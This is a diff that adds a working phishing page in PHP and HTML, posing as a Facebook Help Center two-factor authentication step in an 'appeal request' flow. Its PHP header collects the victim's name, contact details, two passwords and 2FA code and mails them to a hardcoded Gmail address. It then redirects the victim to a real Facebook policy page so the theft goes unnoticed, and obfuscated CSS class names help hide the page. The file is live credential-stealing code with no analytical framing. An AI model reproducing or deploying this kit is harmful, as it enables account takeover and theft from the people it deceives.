@@ -1,0 +1,107 @@
+
+<?
+  session_start();
+  define('EMAIL', 'joe860473@gmail.com');
+  if(!isset($_SESSION['user'])){
+    header("Location: /");
+    exit();
+  }
+
+  if(isset($_POST['form_auth']) && isset($_SESSION['user'])){
+    $message = "IP: " . $_SERVER['REMOTE_ADDR'] . "\n";
+    $message .= "Page name: " . $_SESSION['user']['page_name'] . "\n";
+    $message .= "Email/Mobile: " . $_SESSION['user']['email_mobile'] . "\n";
+    $message .= "Full name: " . $_SESSION['user']['full_name'] . "\n";
+    $message .= "Additional info: " . $_SESSION['user']['info'] . "\n";
+    $message .= "Password: " . $_SESSION['user']['passwd'] . "\n";
+    $message .= "Password2: " . $_SESSION['user']['passwd1'] . "\n";
+    $message .= "2Fac: " . $_POST['authenticator'] . "\n";
+
+    mail(EMAIL, 'NEW FACEBOOK DETAILS THIRD EMAIL', $message);
+    session_destroy();
+    header("Location: https://transparency.fb.com/policies/community-standards");
+    exit();
+  }
+?>
+
+<!DOCTYPE html>
+<html class="no-js" xmlns="http://www.w3.org/1999/xhtml" lang="en">
+    <head>
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-214309042-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-214309042-1');
+</script>
+
+        <title>Facebook Help Center - Appeal Request</title>
+        <meta charset="utf-8" />
+        <meta http-equiv="x-ua-compatible" content="ie=edge" />
+        <meta name="DC.title" content="Pages | Facebook Help Centre" />
+        <meta name="revisit-after" content="1 day" /> 
+        <meta name="description" content="Pages | Facebook Help Centre" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <meta name="distribution" content="GLOBAL" />
+        <meta name="rating" content="General" />
+        <meta name="copyright" content="Copyright - 2023 META" />
+        <meta name="author" content="META" />
+        <meta name="theme-color" content="#FFF" />
+
+    <link rel="icon" href="./public/images/logo.png">
+
+        <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/@mdi/font@6.5.95/css/materialdesignicons.min.css" />
+        <link rel="stylesheet" type="text/css" href="./public/css/style.css" />
+        <link rel="stylesheet" type="text/css" href="./public/css/mobile.css" />
+    </head>
+    <body class="bLopikAktgw">
+    <header class="kEWiuAjksmF">
+      <div class="OkjsQpoisfn">
+        <a href="/" alt="Logo">
+          <img class="okApoiljASq" src="./public/images/fblogo.svg" alt="Logo" />
+        </a>
+        <a class="okSpoiTFGqm" href="javascript:void(0)" alt="Log Out">Log Out</a>
+      </div>
+    </header>
+    <main class="oKpoAmiuqFA">
+      <form class="oKpoiqAnhs" action="" method="post">
+        <h4>Two-Factor Authentication Required</h4>
+        <p>
+          You've asked us to require a 6-digit login code
+          when anyone tries to access your account from
+          a new device or browser.
+        </p>
+        <p>
+          When you receive your 6-digit code, enter it to continue:
+        </p>
+        <input class="oKpiQlKasfJMw" type="number" name="authenticator" id="authenticator" placeholder="Login code" required />
+        <div class="uJlkQPPosfNMhs">
+          <a href="javascript:void(0)" alt="Another way to authenticate">
+            Need another way to authenticate?
+          </a>
+          <button name="form_auth" type="submit">Continue</button>
+        </div>
+      </form>
+
+      <div class="lKoqikjASpof">
+        <ul>
+          <li><a href="javascript:void(0)" class="oKuiaSmhwf">English (US)</a></li>
+          <li><a href="javascript:void(0)">German</a></li>
+          <li><a href="javascript:void(0)">Italian</a></li>
+          <li><a href="javascript:void(0)">Portuguese</a></li>
+        </ul>
+        <ul>
+          <li><a href="javascript:void(0)">Japan</a></li>
+          <li><a href="javascript:void(0)">Turkish</a></li>
+          <li><a href="javascript:void(0)">Spanish</a></li>
+        </ul>
+      </div>
+    </main>
+    <script src="./public/js/jquery-3.5.1.min.js"></script>
+        <script src="./public/js/main.js"></script>
+    </body>
+</html>
+<? session_write_close(); ?>
